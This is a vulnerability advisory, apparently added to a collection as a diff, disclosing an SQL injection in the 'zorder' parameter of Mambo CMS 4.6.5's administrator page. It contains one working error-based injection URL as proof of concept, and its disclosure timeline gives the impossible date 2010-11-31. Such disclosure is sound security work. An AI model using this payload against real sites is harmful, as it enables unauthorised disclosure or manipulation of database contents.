@@ -1,0 +1,60 @@
+=========================================
+Mambo CMS 4.6.x (4.6.5) | SQL Injection 
+=========================================
+
+
+1. OVERVIEW
+
+Mambo CMS 4.6.5 and lower versions are vulnerable to SQL Injection.
+
+
+2. BACKGROUND
+
+Mambo is a full-featured, award-winning content management system that can be used for everything from simple websites to complex corporate applications. It is used all over the world to power government portals, corporate intranets and extranets, ecommerce sites, nonprofit outreach, schools, church, and community sites. Mambo's "power in simplicity" also makes it the CMS of choice for many small businesses and personal sites. 
+
+
+3. VULNERABILITY DESCRIPTION
+
+The "zorder" parameter was not properly sanitized upon submission to the administrator/index2.php url, which allows attacker to conduct  SQL Injection attack. This could an attacker to inject or manipulate SQL queries in the back-end database, allowing for the manipulation or disclosure of arbitrary data.
+
+
+4. VERSIONS AFFECTED
+
+Tested on Mambo CMS 4.6.5
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+http://localhost/mambo/administrator/index2.php?limit=10&order[]=11&boxchecked=0&toggle=on&search=sqli&task=&limitstart=0&cid[]=on&zorder=-1 OR (SELECT 9999 FROM(SELECT COUNT(*),CONCAT(CHAR(58,98,112,101,58),(SELECT (CASE WHEN (9999=9999) THEN 1 ELSE 0 END)),CHAR(58,110,100,107,58),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&filter_authorid=62&hidemainmenu=0&option=com_typedcontent
+
+
+6. SOLUTION
+
+The vendor seems to discontinue the development. It is recommended to use another CMS in active development.
+
+
+7. VENDOR
+
+Mambo CMS Development Team
+http://mambo-developer.org
+
+
+8. CREDIT
+
+This vulnerability was discovered by Aung Khant, http://yehg.net, YGN Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2010-11-31: notified vendor through bug tracker
+2011-08-12: no patched version released up to date
+2011-08-12: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL: http://yehg.net/lab/pr0js/advisories/[mambo4.6_x]_sql_injection
+Mambo CMS: http://mambo-code.org/gf/download/frsrelease/388/791/MamboV4.6.5.zip
+
+
+#yehg [2011-08-12]
